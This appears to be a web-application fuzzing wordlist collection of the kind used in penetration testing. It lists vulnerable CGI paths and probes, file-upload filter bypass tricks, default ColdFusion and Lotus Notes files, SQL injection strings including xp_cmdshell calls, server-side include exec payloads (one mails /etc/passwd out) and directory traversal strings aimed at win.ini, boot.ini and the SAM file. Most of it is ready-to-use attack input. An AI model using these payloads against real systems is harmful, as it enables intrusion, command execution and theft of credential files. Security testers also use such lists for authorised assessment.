    mkplog.exe
    MsmMask.exe?mask=/junk334
    MsmMask.exe?mask=/junk334
    MsmMask.exe?mask=/junk334
    MsmMask.exe?mask=/junk334
    MsmMask.exe?mask=/junk334
    perl.exe?-v
    perl.exe
    ppdscgi.exe
    c32web.exe/ChangeAdminPassword
    windmail.exe
    dbmlparser.exe
    cgimail.exe
    minimal.exe
    rguest.exe
    visitor.exe
    webbbs.exe
    wguest.exe
    /_vti_bin/fpcount.exe?Page=default.htm|Image=3|Digits=15
    cfgwiz.exe
    Cgitest.exe
    mailform.exe
    post16.exe
    imagemap.exe
    htimage.exe/path/filename?2,2
    htimage.exe
    Webnews.exe
    texis.exe/junk
    apexec.pl?etype=odp&template=../../../../../../../../../../etc/passwd%00.html&passurl=/category/
    sensepost.exe?/c+dir
    testcgi.exe
    testcgi.exe?<script>alert(document.cookie)</script>
    ion-p.exe?page=c:\winnt\repair\sam
    ../../../../../../../../../../WINNT/system32/ipconfig.exe
    NUL/../../../../../../../../../WINNT/system32/ipconfig.exe
    PRN/../../../../../../../../../WINNT/system32/ipconfig.exe
    c32web.exe/GetImage?ImageName=CustomerEmail.txt%00.pdf
    foxweb.dll
    wconsole.dll
    shtml.dll
    scripts/slxweb.dll/getfile?type=Library&file=[invalid filename]
    rightfax/fuwww.dll/?
    WINDMAIL.EXE?%20-n%20c:\boot.ini%
    WINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20
    |%20dir%20c:\\
    GW5/GWWEB.EXE
    GW5/GWWEB.EXE?GET-CONTEXT&HTMLVER=AAA
    GW5/GWWEB.EXE?HELP=bad-request
    GWWEB.EXE?HELP=bad-request
    echo.bat
    echo.bat?&dir+c:\\
    hello.bat?&dir+c:\\
    input.bat?
    |dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
    input2.bat?
    |dir
    input2.bat?
    |dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
    test-cgi.bat
    test.bat?
    |dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
    tst.bat
    |dir%20..\\..\\..\\..\\..\\..\\..\\..\\,

### File Upload Filter Bypass (Update: 17 March 2010 - notes only)

    # File Upload Fuzzfile - File Name Filter Bypass
    # adam.muntner@quietmove.com
    # released under creative commons license

    # For MIME filter bypass, your shellscript should look like
    # -------
    # GIF89aP;
    # [shell]
    # -------
    #
    # For mod_cgi Server Side Include upload attacks
    #
    #<!--#exec cmd="ls" -->
    #
    #or, on Windows
    #
    #<!--#exec cmd="dir" -->
    #
    # Sometimes you can overwrite .htaccess in an upload folder on Apache httpd, try setting .jpg to executable. If you can set the target directory, try fuzz the list of all dirs you've enumerated on the servers, and try the commonly writable directory fuzzfile.
    #
    # example .htaccess that sets mime type .jpg to be executable:
    # -----
    # AddType application/x-httpd-php .jpg
    # -----

### File Upload Filter Bypass - Generic (Update: 6 April 2010)

    # adam.muntner@quietmove.com
    # released under creative commons license
    #
    %00index.html
    ;index.html

### File Upload Filter Bypass - PHP Specific (Update: 6 April 2010)

    # adam.muntner@quietmove.com
    # released under creative commons license
    #
    # Another test: use exiftool http://www.sno.phy.queensu.ca/~phil/exiftool/  to create a .jpg image with the meta comment field set to:
    # -----
    #<?php phpinfo(); ?>
    #-----
    {PHPSCRIPT}
    {PHPSCRIPT}.phtml
    {PHPSCRIPT}.php.html
    {PHPSCRIPT}.php.php.rar
    {PHPSCRIPT}.php.rar
    # PHP on Windows
    {PHPSCRIPT}.php::$DATA

### File Upload Filter Bypass - Microsoft Specific (Update: 6 April 2010)

    # adam.muntner@quietmove.com
    # released under creative commons license
    #
    # Another test: use exiftool http://www.sno.phy.queensu.ca/~phil/exiftool/  to create a .jpg image with the meta comment field set to:
    # -----
    #<?php phpinfo(); ?>
    #-----
    {PHPSCRIPT}
    {PHPSCRIPT}.phtml
    {PHPSCRIPT}.php.html
    {PHPSCRIPT}.php::$DATA
    {PHPSCRIPT}.php.php.rar
    {PHPSCRIPT}.php.rar

### Cross-Platform File Upload Filter Bypass - Filename Appends (Update: 17 March 2010 - Total Statements: 2)

    # Cross-Platform File Upload Filter Bypass Appends  (Update: 17 March 2010
    # adam.muntner@quietmove.com
    # released under creative commons license

    %00index.html
    ;index.html

### PHP-Specific Upload Filter Bypass - Filename Appends (Update: 17 March 2010 - Total Statements: 7)

    # PHP-Specific File Upload Filter Bypass Appends  (Update: 17 March 2010 - notes
    # adam.muntner@quietmove.com
    # released under creative commons license
    # also: use "gim" to create a .jpg image with the meta comment field set to:
    # -----
    #<?php phpinfo(); ?>
    #-----

    {PHPSCRIPT}
    {PHPSCRIPT}.phtml
    {PHPSCRIPT}.php.html
    {PHPSCRIPT}.php::$DATA
    {PHPSCRIPT}.php.php.rar
    {PHPSCRIPT}.php.rar
    {PHPSCRIPT}.php.doc
    {PHPSCRIPT}.php.xls
    {PHPSCRIPT}.php.xlsx
    {PHPSCRIPT}.php.pdf
    {PHPSCRIPT}.php.jpeg
    {PHPSCRIPT}.php.gif
    {PHPSCRIPT}.php.zip

### Microsoft-Specific Cross-Platform File Upload Filter Bypass - Filename Appends (Update: 17 March 2010 - Total Statements: 14)

    # Microsoft-Specific Cross-Platform File Upload Filter Bypass Appends  (Update: 17 March 2009
    # adam.muntner@quietmove.com
    # released under creative commons license

    {ASPSCRIPT}
    {ASPSCRIPT};
    {ASPSCRIPT};.jpg
    {ASPSCRIPT};.pdf
    {ASPSCRIPT};.html
    {ASPSCRIPT};.htm
    {ASPSCRIPT};.txt
    {ASPSCRIPT};.xyz
    {ASPSCRIPT};.zip
    {ASPSCRIPT};.tgz
    {ASPSCRIPT};.doc
    {ASPSCRIPT};.docx
    {ASPSCRIPT};.xls
    {ASPSCRIPT};.xlsx

### Commonly Writable Directories - For File Upload Filter Bypass - Filename Appends (Update: 10 April 2010 - Total Statements: 9)

    #Commonly Writable Directories - For File Upload Filter Bypass - Filename Appends  (Update: 17 March 2010)
    # adam.muntner@quietmove.com
    # released under creative commons license

    {PREFIX}/templates_compiled/
    {PREFIX}/templates_c/
    {PREFIX}/templates/
    {PREFIX}/temporary/
    {PREFIX}/images/
    {PREFIX}/cache/
    {PREFIX}/temp/
    {PREFIX}/files/
    {PREFIX}/tmp/

### Common Data File Extensions (Update: 16 March 2010 - Total Statements: 863)

```
 #Common Data File Extensions  (Update: 16 March 2010 - Total Statements: 863
# adam.muntner@quietmove.com
# released under creative commons license

<pre>
.$er
.123
.1pe
.1ph
.3dr
.3dt
.3me
.3pe
.4dl
.4dv
.8xk
.^^^
.a3l
.a3m
.a3w
.a4l
.a4m
.a4w
.a5l
.a5w
.a65
.aao
.ab
.ab1
.ab2
.ab3
.abcd
.abi
.abp
.aby
.aca
.acc
.accdb
.acf
.acg
.ade
.adp
.adt
.adx
.aft
.agd
.aifb
.alc
.ald
.ali
.amb
.amsorm
.an1
.anme
.apr
.arc
.arh
.ask
.asm
.ast
.at5
.att
.aw
.awg
.azw
.bafl
.bci
.bcm
.bdf
.bdic
.bfx
.bgl
.bgt
.bin
.bjo
.bk
.bkk
.blb
.bld
.blg
.bok
.box
.brd
.brw
.btf
.btif
.btm
.btr
.cap
.cat
.cbg
.cch
.ccr
.cct
.cdb
.cdd
.cdf
.cdp
.cdr
.cdx
.cel
.celtx
.chg
.chk
.chn
.ckd
.ckt
.cl2
.cl4
.clb
.clix
.clm
.clp
.cmbl
.cna
.contact
.cpi
.cpmz
.crd
.crtx
.csa
.csv
.ctf
.ctt
.cursorfx
.curxptheme
.cvd
.cvn
.cwk
.cws
.cwz
.cxt
.cyo
.cys
.daf
.dal
.dam
.das
.dat
.data
.db
.db2
.db3
.dbc
.dbd
.dbf
.dbx
.dcf
.dcl
.dcm
.dcmd
.ddc
.ddcx
.ddt
.dem
.des
.dex
.dfm
.dfproj
.dft
.dgb
.dif
.dii
.dlg
.dm2
.dmo
.dmsk
.dnc
.dockzip
.dp1
.dpn
.dpx
.drl
.dsb
.dsd
.dsk
.dsy
.dsz
.dt0
.dt1
.dt2
.dta
.dtr
.dvdproj
.dvo
.dwi
.e00
.eap
.ebuild
.ec0
.eco
.ecx
.edb
.edf
.eep
.efx
.egp
.emb
.emd
.emlxpart
.enc
.enw
.epp
.epub
.epw
.er1
.esp
.ess
.est
.esx
.et
.eta
.etd
.etl
.ev
.ev3
.evt
.evy
.exif
.exp
.exx
.fa
.fasta
.fbl
.fcd
.fcs
.fdb
.ffd
.ffwp
.fhc
.fid
.fil
.flame
.fll
.flo
.flp
.flt
.fm
.fm5
.fmp
.fo
.fob
.fol
.fop
.fox
.fp
.fp3
.fp4
.fp5
.fp7
.frl
.frm
.fro
.frx
.fsb
.fsc
.ftm
.ftw
.gan
.gbr
.gc
.gcx
.gdb
.ged
.gedcom
.gen
.ggb
.gml
.gms
.gno
.gnp
.gp3
.gpi
.gps
.gpx
.gra
.grade
.grf
.grib
.grk
.grr
.grv
.gs
.gst
.gtp
.gwk
.gxl
.hcc
.hce
.hci
.hcp
.hcr
.hcu
.hda
.hdb
.hdf
.hdi
.hdl
.hif
.hl
.hml
.hmt
.hs2
.hsk
.hst
.htg
.huh
.hyv
.i5z
.ib
.ics
.id2
.idx
.igc
.ihx
.ii
.iif
.img
.imt
.ink
.inp
.ins
.ip
.irock
.irr
.irx
.isf
.itdb
.itl
.itm
.itn
.itw
.itx
.ivt
.iw
.ixb
.jasper
.jdb
.jef
.jmp
.jnt
.job
.joboptions
.joined
.jph
.jrprint
.jrxml
.jude
.kap
.kdb
.kid
.kismac
.kmz
.kpf
.kpp
.kpr
.kpx
.kpz
.l
.l6t
.laccdb
.lbl
.lbx
.lcd
.lcf
.lcm
.ldif
.lex
.lgc
.lgf
.lgh
.lgi
.lgl
.lib
.lif
.livereg
.liveupdate
.lix
.llb
.lms
.lmx
.lnt
.loc
.lp7
.lrf
.lrs
.lrx
.lsf
.lsl
.lsp
.lsr
.lst
.lsu
.lvm
.lw4
.ly
.m
.mag
.mai
.map
.masseffectprofile
.mat
.mbb
.mbf
.mbg
.mbl
.mbp
.mbx
.mc1
.mc9
.mcd
.md
.mdb
.mdc
.mdf
.mdl
.mdm
.mdn
.mdt
.mdx
.mdz
.mem
.menc
.met
.mex
.mfo
.mfp
.mgc
.mls
.mm
.mmap
.mmc
.mmf
.mmp
.mnc
.mng
.mnk
.mno
.mny
.mobi
.moho
.mosaic
.mox
.mpd
.mpj
.mpp
.mpt
.mpx
.mpz
.mq4
.ms10
.mth
.mtw
.mud
.muf
.mw
.mwf
.mws
.mwx
.mxd
.myd
.myi
.nb
.nc
.ndf
.ndk
.ndx
.net
.neta
.nfo
.nitf
.nmind
.not
.notebook
.np
.npl
.npt
.nrl
.ns2
.ns3
.ns4
.nsf
.ntx
.numbers
.nvl
.nyf
.oab
.obj
.odb
.odf
.odp
.ods
.odx
.oeaccount
.ofc
.ofm
.oft
.ofx
.omcs
.omp
.ond
.one
.oo3
.opf
.opx
.or2
.or3
.or4
.or5
.or6
.org
.orx
.otf
.otl
.otln
.ots
.out
.ov2
.ova
.ovf
.p96
.p97
.pab
.paf
.pan
.pbd
.pc
.pcap
.pcb
.pcr
.pd4
.pd5
.pdas
.pdb
.pdd
.pdm
.pds
.pdx
.peb
.pec
.pep
.pex
.pfc
.pfl
.phb
.phm
.pi
.pis
.pjx
.pka
.pkb
.pkh
.pks
.pkt
.pln
.plw
.pmo
.pmr
.pnproj
.pnpt
.pns
.pnt
.pod
.poi
.pos
.postal
.pot
.potm
.potx
.pp2
.ppf
.pps
.ppsx
.ppt
.pptm
.pptx
.prc
.pre
.prf
.prj
.prm
.prs
.psa
.psf
.psm
.pst
.ptb
.ptf
.ptk
.ptm
.ptn
.ptt
.ptz
.pvl
.pwd
.pxj
.pxl
.q07
.q08
.q09
.q3d
.qbw
.qdat
.qdf
.qdfm
.qel
.qfx
.qif
.qpb
.qpf
.qph
.qpm
.qpw
.qrp
.qsd
.ral
.rbt
.rcd
.rcg
.rdb
.rdf
.rdx
.ref
.ret
.rf1
.rfa
.rfo
.rge
.rgn
.rgo
.rmuf
.rnq
.rod
.rog
.roi
.rou
.rpp
.rpt
.rrt
.rsc
.rsd
.rsw
.rte
.rvt
.rwg
.rzb
.s85
.saf
.sam07
.sar
.sav
.sbd
.sbf
.sbq
.sbt
.sca
.scf
.sch
.sdb
.sdc
.sdf
.sdp
.sdq
.sds
.sen
.seo
.seq
.ser
.sgml
.sgn
.shp
.shs
.shx
.skc
.skv
.skx
.sle
.slk
.slp
.snapfireshow
.sonic
.soundpack
.spo
.sps
.spub
.spv
.sq
.sqd
.sql
.sqlite
.sqr
.sta
.stc
.stf
.stk
.stl
.stm
.stp
.str
.stt
.stw
.styk
.stykz
.swk
.sxc
.sxi
.sy3
.t01
.t02
.t03
.t04
.t05
.t06
.t07
.t08
.t09
.t2
.t3001
.tax2008
.tax2009
.tb
.tbk
.tbl
.tcc
.tcx
.tda
.tdl
.tdm
.tdt
.te
.te3
.teacher
.tef
.tet
.tfa
.tfd
.tfrd
.tjp
.tk3
.tkfl
.tmw
.tol
.topc
.tpb
.tps
.tr3
.tra
.trd
.trk
.trs
.trx
.tst
.tsv
.ttk
.txa
.txd
.txf
.uccapilog
.ud
.udb
.udeb
.uds
.ulf
.ulz
.update
.upoi
.usr
.uvf
.uwl
.val
.vbpf1
.vcd
.vce
.vcf
.vcs
.vdb
.vdx
.vfs
.vi
.vip
.vle
.vlg
.vmt
.voi
.vok
.vrd
.vscontent
.vsx
.vtx
.vxml
.w02
.wab
.wb1
.wb2
.wb3
.wdb
.wdq
.wea
.wfd
.wfm
.wgp
.wgt
.windowslivecontact
.wjr
.wk1
.wk2
.wk3
.wk4
.wk5
.wke
.wki
.wks
.wku
.wlmp
.wmdb
.wor
.wpc
.wpf
.wpo
.wq1
.wq2
.wtb
.wtr
.xbk
.xdb
.xdp
.xds
.xef
.xem
.xfd
.xfo
.xft
.xl
.xlc
.xlgc
.xlr
.xls
.xlsb
.xlsm
.xlsx
.xlt
.xltm
.xltx
.xlw
.xmcd
.xml
.xmlper
.xmpz
.xpg
.xpj
.xpm
.xpt
.xrp
.xsl
.xslt
.xsn
.xtm
.xtp
.xxd
.yam
.zap
.zdb
.zdc
.zix
.zmc
.zpl
.{pb
.~hm
```

### Compressed File Types - (Update: 16 March 2010 - Total Statements: 187)

    #  Compressed File Types - (Update: 16 March 2010 - Total Statements: 187)
    # adam.muntner@quietmove.com
    # creative commons

    .0
    .000
    .7z
    .a00
    .a01
    .a02
    .ace
    .ain
    .alz
    .apz
    .ar
    .arc
    .arh
    .ari
    .arj
    .ark
    .axx
    .b64
    .ba
    .bh
    .boo
    .bz
    .bz2
    .bzip
    .bzip2
    .c00
    .c01
    .c02
    .car
    .cb7
    .cbr
    .cbt
    .cbz
    .cp9
    .cpgz
    .cpt
    .dar
    .dd
    .deb
    .dgc
    .dist
    .ecs
    .efw
    .epi
    .f
    .fdp
    .gca
    .gz
    .gzi
    .gzip
    .ha
    .hbc
    .hbc2
    .hbe
    .hki
    .hki1
    .hki2
    .hki3
    .hpk
    .hyp
    .ice
    .ipg
    .ipk
    .ish
    .j
    .jar.pack
    .jgz
    .jic
    .kgb
    .lbr
    .lemon
    .lha
    .lnx
    .lqr
    .lz
    .lzh
    .lzm
    .lzma
    .lzo
    .lzx
    .md
    .mint
    .mou
    .mpkg
    .mzp
    .oar
    .p7m
    .pack.gz
    .package
    .pae
    .pak
    .paq6
    .paq7
    .paq8
    .par
    .par2
    .pbi
    .pcv
    .pea
    .pet
    .pf
    .pim
    .pit
    .piz
    .pkg
    .pup
    .puz
    .pwa
    .qda
    .r0
    .r00
    .r01
    .r02
    .r03
    .r1
    .r2
    .r30
    .rar
    .rev
    .rk
    .rnc
    .rp9
    .rpm
    .rte
    .rz
    .rzs
    .s00
    .s01
    .s02
    .s7z
    .sar
    .sdc
    .sdn
    .sea
    .sen
    .sfs
    .sfx
    .sh
    .shar
    .shk
    .shr
    .sit
    .sitx
    .spt
    .sqx
    .sqz
    .tar
    .tar.gz
    .tar.xz
    .taz
    .tbz
    .tbz2
    .tg
    .tgz
    .tlz
    .tlzma
    .txz
    .tz
    .uc2
    .uha
    .vem
    .vsi
    .wad
    .war
    .wot
    .xef
    .xez
    .xmcdz
    .xpi
    .xx
    .xz
    .y
    .yz
    .z
    .z01
    .z02
    .z03
    .z04
    .zap
    .zfsendtotarget
    .zip
    .zipx
    .zix
    .zoo
    .zpi
    .zz

### Uncommon Data File Extensions (Update: 16 March 2010 - Total Statements: 284)

    # Uncommon Data File Extensions  (Update: 16 March 2010 - Total Statements: 284)
    # adam.muntner@quietmove.com
    # creative commons

    .3me
    .3pe
    .4dl
    .8xk
    .^^^
    .aao
    .ab2
    .aca
    .accdb
    .acf
    .acg
    .agd
    .an1
    .anme
    .arc
    .arh
    .ast
    .att
    .aw
    .bafl
    .bdf
    .bfx
    .bjo
    .bld
    .blg
    .btf
    .btif
    .btr
    .cct
    .cdb
    .cdd
    .cdf
    .cdp
    .cdr
    .chk
    .ckd
    .cl2
    .cl4
    .clb
    .clix
    .clm
    .cmbl
    .contact
    .cpi
    .cpmz
    .csv
    .cwz
    .cxt
    .daf
    .dat
    .data
    .db
    .dcf
    .ddt
    .dex
    .dif
    .dmsk
    .dnc
    .dpx
    .dsd
    .dt1
    .dt2
    .dta
    .e00
    .ec0
    .edf
    .eep
    .efx
    .enc
    .enw
    .epw
    .est
    .et
    .eta
    .ev3
    .exif
    .exp
    .fbl
    .fdb
    .fid
    .fol
    .gdb
    .gen
    .gnp
    .gpi
    .gpx
    .hcp
    .hdf
    .hmt
    .hsk
    .htg
    .id2
    .ii
    .img
    .ink
    .ins
    .irr
    .irx
    .iw
    .jdb
    .jnt
    .job
    .jrprint
    .kmz
    .lbx
    .lex
    .lgf
    .lgl
    .lib
    .liveupdate
    .lnt
    .lst
    .m
    .masseffectprofile
    .mat
    .mbb
    .mdb
    .mem
    .menc
    .met
    .mmf
    .mng
    .mpd
    .mpp
    .ms10
    .muf
    .mw
    .mwf
    .mwx
    .nc
    .ndx
    .nfo
    .not
    .ns2
    .ns3
    .ns4
    .ntx
    .numbers
    .ods
    .oeaccount
    .omcs
    .or2
    .or3
    .or4
    .or5
    .orx
    .out
    .ov2
    .ovf
    .paf
    .pbd
    .pcr
    .pdb
    .pdx
    .peb
    .pec
    .pfc
    .pis
    .pln
    .pnpt
    .pns
    .pnt
    .pos
    .postal
    .pps
    .ppsx
    .ppt
    .pptm
    .pptx
    .pre
    .prf
    .psa
    .psf
    .pst
    .ptz
    .q07
    .q3d
    .qbw
    .qdat
    .qdf
    .qfx
    .qpf
    .qpw
    .qsd
    .rcd
    .rdx
    .ref
    .rmuf
    .roi
    .rrt
    .rvt
    .rwg
    .saf
    .sam07
    .sbd
    .sbf
    .sbq
    .sbt
    .sdb
    .sdc
    .sdf
    .sds
    .ser
    .sgn
    .shs
    .skc
    .slk
    .sonic
    .soundpack
    .spo
    .sql
    .stf
    .stl
    .stm
    .sy3
    .t08
    .t09
    .t2
    .tax2009
    .tdl
    .tdt
    .te
    .teacher
    .tmw
    .tol
    .trk
    .trs
    .trx
    .tsv
    .uccapilog
    .ud
    .udeb
    .uds
    .update
    .uwl
    .val
    .vcf
    .vdb
    .vfs
    .vip
    .vle
    .vlg
    .vxml
    .w02
    .wab
    .wb1
    .wb3
    .wdq
    .wfd
    .wfm
    .windowslivecontact
    .wk1
    .wk2
    .wk3
    .wk4
    .wk5
    .wke
    .wks
    .wlmp
    .wpc
    .wpo
    .wq1
    .wq2
    .wtr
    .xbk
    .xdb
    .xds
    .xfd
    .xl
    .xlgc
    .xlr
    .xls
    .xlsx
    .xltm
    .xltx
    .xml
    .xmpz
    .xsl
    .xsn
    .xtm
    .xtp
    .xxd
    .{pb
    .~hm

### Cold Fusion Default Files - (Update: 16 March 2010 - Total Statements: 65)

    #  Cold Fusion Default Files - (Update: 16 March 2010 - Total Statements: 65)
    # adam.muntner@quietmove.com
    # creative commons

    CFIDE/Administrator/
    CFIDE/Administrator/index.cfm
    CFIDE/Administrator/login.cfm
    CFIDE/Administrator/Application.cfm
    CFIDE/Application.cfm
    CFIDE/adminapi/
    CFIDE/adminapi/Application.cfm
    CFIDE/adminapi/administrator.cfc
    CFIDE/adminapi/base.cfc
    CFIDE/adminapi/customtags/
    CFIDE/adminapi/customtags/l10n.cfm
    CFIDE/adminapi/customtags/resources
    CFIDE/adminapi/customtags/resources/
    CFIDE/adminapi/datasource.cfc
    CFIDE/adminapi/debugging.cfc
    CFIDE/adminapi/eventgateway.cfc
    CFIDE/adminapi/extensions.cfc
    CFIDE/adminapi/mail.cfc
    CFIDE/adminapi/runtime.cfc
    CFIDE/adminapi/security.cfc
    CFIDE/adminapi/_datasource/
    CFIDE/adminapi/_datasource/formatjdbcurl.cfm
    CFIDE/adminapi/_datasource/getaccessdefaultsfromregistry.cfm
    CFIDE/adminapi/_datasource/geturldefaults.cfm
    CFIDE/adminapi/_datasource/setdsn.cfm
    CFIDE/adminapi/_datasource/setmsaccessregistry.cfm
    CFIDE/adminapi/_datasource/setsldatasource.cfm
    CFIDE/classes/
    CFIDE/classes/cf-j2re-win.cab
    CFIDE/classes/cfapplets.jar
    CFIDE/classes/images
    CFIDE/componentutils/
    CFIDE/componentutils/Application.cfm
    CFIDE/componentutils/cfcexplorer.cfc
    CFIDE/componentutils/cfcexplorer_utils.cfm
    CFIDE/componentutils/componentdetail.cfm
    CFIDE/componentutils/componentdoc.cfm
    CFIDE/componentutils/componentlist.cfm
    CFIDE/componentutils/gatewaymenu
    CFIDE/componentutils/gatewaymenu/
    CFIDE/componentutils/gatewaymenu/menu.cfc
    CFIDE/componentutils/gatewaymenu/menunode.cfc
    CFIDE/componentutils/login.cfm
    CFIDE/componentutils/packagelist.cfm
    CFIDE/componentutils/utils.cfc
    CFIDE/componentutils/_component_cfcToHTML.cfm
    CFIDE/componentutils/_component_cfcToMCDL.cfm?
    CFIDE/componentutils/_component_style.cfm
    CFIDE/componentutils/_component_utils.cfm
    CFIDE/debug/
    CFIDE/debug/images/
    CFIDE/debug/includes/
    CFIDE/images/
    CFIDE/images/skins/
    CFIDE/install.cfm
    CFIDE/installers/
    CFIDE/installers/CFMX7DreamWeaverExtensions.mxp
    CFIDE/installers/CFReportBuilderInstaller.exe
    CFIDE/probe.cfm
    CFIDE/scripts/
    CFIDE/scripts/css/
    CFIDE/scripts/xsl/
    CFIDE/wizards/
    CFIDE/wizards/common/
    CFIDE/wizards/common/utils.cfc

### All HTTP Verbs Defined in RFC's + 1 ARBITRARY Verb - (Update: 16 March 2009 - Total Statements: 31)

    #  ll HTTP Verbs Defined in RFC's + 1 ARBITRARY Verb - (Update: 16 March 2009 - Total Statements: 31)
    # adam.muntner@quietmove.com
    # creative commons

    OPTIONS
    GET
    HEAD
    POST
    PUT
    DELETE
    TRACE
    CONNECT
    PROPFIND
    PROPPATCH
    MKCOL
    COPY
    MOVE
    LOCK
    UNLOCK
    VERSION-CONTROL
    REPORT
    CHECKOUT
    CHECKIN
    UNCHECKOUT
    MKWORKSPACE
    UPDATE
    LABEL
    MERGE
    BASELINE-CONTROL
    MKACTIVITY
    ORDERPATCH
    ACL
    PATCH
    SEARCH
    ARBITRARY

### Lotus/Notes Files -(Update: 02 February 2010 - Total Statements: 111)

    /852566C90012664F
    /admin4.nsf
    /admin5.nsf
    /admin.nsf
    /agentrunner.nsf
    /alog.nsf
    /a_domlog.nsf
    /bookmark.nsf
    /busytime.nsf
    /catalog.nsf
    /certa.nsf
    /certlog.nsf
    /certsrv.nsf
    /chatlog.nsf
    /clbusy.nsf
    /cldbdir.nsf
    /clusta4.nsf
    /collect4.nsf
    /da.nsf
    /dba4.nsf
    /dclf.nsf
    /DEASAppDesign.nsf
    /DEASLog01.nsf
    /DEASLog02.nsf
    /DEASLog03.nsf
    /DEASLog04.nsf
    /DEASLog05.nsf
    /DEASLog.nsf
    /decsadm.nsf
    /decslog.nsf
    /DEESAdmin.nsf
    /dirassist.nsf
    /doladmin.nsf
    /domadmin.nsf
    /domcfg.nsf
    /domguide.nsf
    /domlog.nsf
    /dspug.nsf
    /events4.nsf
    /events5.nsf
    /events.nsf
    /event.nsf
    /homepage.nsf
    /iNotes/Forms5.nsf/$DefaultNav
    /jotter.nsf
    /leiadm.nsf
    /leilog.nsf
    /leivlt.nsf
    /log4a.nsf
    /log.nsf
    /l_domlog.nsf
    /mab.nsf
    /mail10.box
    /mail1.box
    /mail2.box
    /mail3.box
    /mail4.box
    /mail5.box
    /mail6.box
    /mail7.box
    /mail8.box
    /mail9.box
    /mail.box
    /msdwda.nsf
    /mtatbls.nsf
    /mtstore.nsf
    /names.nsf
    /nntppost.nsf
    /nntp/nd000001.nsf
    /nntp/nd000002.nsf
    /nntp/nd000003.nsf
    /ntsync45.nsf
    /perweb.nsf
    /qpadmin.nsf
    /quickplace/quickplace/main.nsf
    /reports.nsf
    /sample/siregw46.nsf
    /schema50.nsf
    /setupweb.nsf
    /setup.nsf
    /smbcfg.nsf
    /smconf.nsf
    /smency.nsf
    /smhelp.nsf
    /smmsg.nsf
    /smquar.nsf
    /smsolar.nsf
    /smtime.nsf
    /smtpibwq.nsf
    /smtpobwq.nsf
    /smtp.box
    /smtp.nsf
    /smvlog.nsf
    /srvnam.htm
    /statmail.nsf
    /statrep.nsf
    /stauths.nsf
    /stautht.nsf
    /stconfig.nsf
    /stconf.nsf
    /stdnaset.nsf
    /stdomino.nsf
    /stlog.nsf
    /streg.nsf
    /stsrc.nsf
    /userreg.nsf
    /vpuserinfo.nsf
    /webadmin.nsf
    /web.nsf
    /.nsf/../winnt/win.ini
    /?Open

### SQL Injection -(Update: 11 August 2009 - Total Statements: 126)

    Statement
    'sqlvuln
    '+sqlvuln
    sqlvuln;
    (sqlvuln)
    a' or 1=1--
    "a"" or 1=1--"
     or a = a
    a' or 'a' = 'a
    1 or 1=1
    a' waitfor delay '0:0:10'--
    1 waitfor delay '0:0:10'--
    declare @q nvarchar (4000) select @q =
    0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
    0
    031003000270000
    declare @s varchar(22) select @s =
    0x77616974666F722064656C61792027303A303A31302700 exec(@s)
    0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
    declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e
    exec(@s)
    a'
    ?
    ' or 1=1
    ‘ or 1=1 --
    x' AND userid IS NULL; --
    x' AND email IS NULL; --
    anything' OR 'x'='x
    x' AND 1=(SELECT COUNT(*) FROM tabname); --
    x' AND members.email IS NULL; --
    x' OR full_name LIKE '%Bob%
    23 OR 1=1
    '; exec master..xp_cmdshell 'ping 172.10.1.255'--
    '
    '%20or%20''='
    '%20or%20'x'='x
    %20or%20x=x
    ')%20or%20('x'='x
    0 or 1=1
    ' or 0=0 --
    " or 0=0 --
    or 0=0 --
    ' or 0=0 #
     or 0=0 #"
    or 0=0 #
    ' or 1=1--
    " or 1=1--
    ' or '1'='1'--
    ' or 1 --'
    or 1=1--
    or%201=1
    or%201=1 --
    ' or 1=1 or ''='
     or 1=1 or ""=
    ' or a=a--
     or a=a
    ') or ('a'='a
    ) or (a=a
    hi or a=a
    hi or 1=1 --"
    hi' or 1=1 --
    hi' or 'a'='a
    hi') or ('a'='a
    "hi"") or (""a""=""a"
    'hi' or 'x'='x';
    @variable
    ,@variable
    PRINT
    PRINT @@variable
    select
    insert
    as
    or
    procedure
    limit
    order by
    asc
    desc
    delete
    update
    distinct
    having
    truncate
    replace
    like
    handler
    bfilename
    ' or username like '%
    ' or uname like '%
    ' or userid like '%
    ' or uid like '%
    ' or user like '%
    exec xp
    exec sp
    '; exec master..xp_cmdshell
    '; exec xp_regread
    t'exec master..xp_cmdshell 'nslookup www.google.com'--
    --sp_password
    \x27UNION SELECT
    ' UNION SELECT
    ' UNION ALL SELECT
    ' or (EXISTS)
    ' (select top 1
    '
    |
    |UTL_HTTP.REQUEST
    1;SELECT%20*
    to_timestamp_tz
    tz_offset
    <>"'%;)(&+
    '%20or%201=1
    %27%20or%201=1
    %20$(sleep%2050)
    %20'sleep%2050'
    char%4039%41%2b%40SELECT
    &apos;%20OR
    'sqlattempt1
    (sqlattempt2)
    |
    %7C
    *
    |
    %2A%7C
    *(
    |(mail=*))
    %2A%28%7C%28mail%3D%2A%29%29
    *(
    |(objectclass=*))
    %2A%28%7C%28objectclass%3D%2A%29%29
    (
    %28
    )
    %29
    &
    %26
    !
    %21
    ' or 1=1 or ''='
    ' or ''='
    x' or 1=1 or 'x'='y
    /
    //
    //*
    */*
    a' or 3=3--
    "a"" or 3=3--"
    ' or 3=3
    ‘ or 3=3 --

### SSI (Server Side Includes) - (Update: 30 July 2007 - Total Statements: 4)

    # Some server side include statements
    # Florian Roth @4nc4p

    <!--#exec cmd="/bin/ls /" --><br/>
    <!--#exec cmd="cat /etc/passwd" --><br/>
    <!--#exec cmd="find / -name *.* -print" --><br/>
    <!--#exec cmd="mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd" --><br/>

### Directory Traversal - (Update: 11 August 2009 - Total Statements: 132)

    Statement
    \..\WINDOWS\win.ini
    \..\..\WINDOWS\win.ini
    \..\..\..\WINDOWS\win.ini
    \..\..\..\..\WINDOWS\win.ini
    \..\..\..\..\..\WINDOWS\win.ini
    \..\..\..\..\..\..\WINDOWS\win.ini
    %5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
    %5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
